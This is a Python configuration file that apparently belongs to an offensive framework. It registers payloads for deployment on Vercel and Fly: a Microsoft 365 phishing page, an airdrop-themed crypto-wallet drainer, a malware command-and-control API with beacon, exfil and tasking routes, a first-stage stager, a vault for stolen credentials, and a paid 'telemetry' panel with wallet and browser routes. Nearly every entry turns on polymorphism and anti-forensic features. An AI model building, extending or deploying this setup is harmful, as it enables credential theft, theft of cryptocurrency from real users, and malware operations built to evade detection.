# payloads_config.py — Operator defines what payloads to deploy each cycle

from core.payload_registry import PayloadRegistry, PayloadDefinition

def build_registry() -> PayloadRegistry:
    reg = PayloadRegistry()

    # --- Phishing: Microsoft 365 login ---
    reg.add(PayloadDefinition(
        id="ms365-phish",
        payload_type="phishing",
        serve_on="vercel",
        target_brand="microsoft",
        target_url="https://login.microsoftonline.com",
        post_action="redirect",
        polymorphic=True,
        anti_forensic=True
    ))

    # --- Drainer: Airdrop claim page ---
    reg.add(PayloadDefinition(
        id="airdrop-drain",
        payload_type="drainer",
        serve_on="vercel",
        custom_config={
            "page_title": "Claim Your Airdrop Reward",
            "headline": "Claim Your Airdrop Reward",
            "subtext": "Connect your wallet to verify eligibility",
            "drain_address": "0xROTATE_PER_CYCLE"
        },
        polymorphic=True,
        anti_forensic=True
    ))

    # --- Malware API: C2 tasking + exfil ---
    reg.add(PayloadDefinition(
        id="c2-api",
        payload_type="malware_api",
        serve_on="fly",
        api_routes=["/api/beacon", "/api/exfil", "/api/task"],
        auth_method="session_key",
        polymorphic=True,
        anti_forensic=True
    ))

    # --- Stager: lightweight first-stage dropper ---
    reg.add(PayloadDefinition(
        id="stager-01",
        payload_type="stager",
        serve_on="both",
        polymorphic=True,
        anti_forensic=True
    ))

    # --- Credential vault: stores exfil'd creds ---
    reg.add(PayloadDefinition(
        id="cred-vault",
        payload_type="credential_vault",
        serve_on="fly",
        api_routes=["/api/auth", "/api/verify", "/api/session", "/api/token"],
        auth_method="session_key",
        anti_forensic=True
    ))

    # --- Telemetry platform: flipper (full-stack app on Fly VM) ---
    reg.add(PayloadDefinition(
        id="flipper-telemetry",
        payload_type="telemetry_platform",
        serve_on="both",
        docker_image="registry.fly.io/chimera-flipper:latest",
        vm_memory_mb=1024,
        vm_machine_type="shared-cpu-2x",
        api_routes=[
            "/auth", "/dashboard", "/admin", "/subscription",
            "/payment", "/builder", "/api/browser", "/api/wallets",
            "/api/filesearch", "/api/asar", "/api/search"
        ],
        auth_method="session_key",
        polymorphic=True,
        anti_forensic=True,
        custom_config={
            "session_secret": "ROTATE_PER_CYCLE",
            "oxapay_merchant_key": "sandbox",
            "base_url": "ROTATE_PER_CYCLE",
        }
    ))

    return reg
